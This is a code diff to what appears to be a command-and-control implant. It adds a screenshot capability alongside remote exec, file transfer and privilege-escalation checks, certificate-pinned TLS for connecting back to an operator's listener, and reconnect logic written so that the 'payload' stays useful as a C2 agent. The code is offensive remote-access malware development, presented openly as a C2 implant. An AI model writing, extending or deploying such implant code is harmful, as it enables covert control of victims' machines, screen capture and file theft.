@@ -706,6 +706,7 @@ CAPABILITIES = [
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
+    {% if include_screenshot %}"screenshot",{% endif %}
     "ping", "shutdown",
 ]
 
@@ -2239,6 +2240,12 @@ class ListenerClient:
 
     def connect(self) -> bool:
         self._sock = _sk.create_connection((self._host, self._port), timeout=self._timeout)
+        if TLS_ON:
+            # Pin the listener to the certificate compiled into this build, the
+            # same way the beacon transport does. A plaintext connect to a TLS
+            # listener is a WRONG_VERSION_NUMBER handshake failure on the wire.
+            ctx = pinned_tls_context()
+            self._sock = ctx.wrap_socket(self._sock, server_hostname=self._host)
         self._fp = self._sock.makefile("rwb")
         return True
 
@@ -2338,7 +2345,10 @@ def _listener_loop() -> None:
     client = ListenerClient(host, port)
     # (Re)connect + register, retrying on a refused or lost link. An agent that
     # exits the first time the listener is not up yet is worthless as a C2 — the
-    # listener routinely starts after the payload, and restarts under it.
+    # listener routinely starts after the payload, and restarts under it. But a
+    # registration the listener *rejects* (wrong/absent enrollment secret) is
+    # not transient: retrying it forever is bad egress, not persistence, so it
+    # stops with the same exit code the beacon loop uses.
     def _attach() -> ListenerClient:
         while True:
             try:
@@ -2346,7 +2356,15 @@ def _listener_loop() -> None:
                 c.connect()
                 c.register()
                 return c
-            except (TransportError, OSError) as e:
+            except TransportError as e:
+                if "auth_failed" in str(e):
+                    _log("listener rejected our enrollment secret; rebuild this "
+                         "payload from the team server that owns the listener",
+                         "error")
+                    raise SystemExit(3)
+                _log(f"listener rejected us ({e}); retrying", "debug")
+                _t.sleep(5)
+            except OSError as e:
                 _log(f"listener unreachable ({e}); retrying", "debug")
                 _t.sleep(5)
     client = _attach()
